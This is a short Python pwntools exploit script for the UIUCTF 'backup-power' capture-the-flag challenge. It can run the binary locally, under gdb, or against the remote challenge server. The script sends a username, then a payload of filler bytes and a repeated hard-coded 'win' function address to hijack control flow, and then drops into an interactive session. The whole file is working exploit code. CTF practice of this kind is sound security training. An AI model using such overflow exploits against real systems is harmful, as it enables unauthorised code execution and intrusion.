from pwn import *
import sys

_path = "./backup-power"
exe = ELF(_path)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
add = 'backup-power.chal.uiuc.tf'
port = 1337
cmd = '''
    continue
'''

def conn():
    _type = ''
    try:
        _type = sys.argv[1]
    except:
        return gdb.debug(_path, cmd)
    finally:
        if(_type == 'run'):
            return process(_path)
        if(_type == 'exp'):
            return remote(add, port, ssl = True)

context.log_level = 'debug'

chall = conn()
_win = 0x400D8C
_cfi = 0xfffffd68
def _try(payload):
    chall.sendlineafter(b'Username: ', b'devolper')
    sleep(1)
    chall.sendline(payload)

def p(_data):
    return p64(_data, endian = 'little')

def main():
    payload = b'1' * 4 * 4 + p(_win) * 3
    _try(payload)
    _try(payload)
    chall.interactive()


if __name__ == "__main__":
    main()
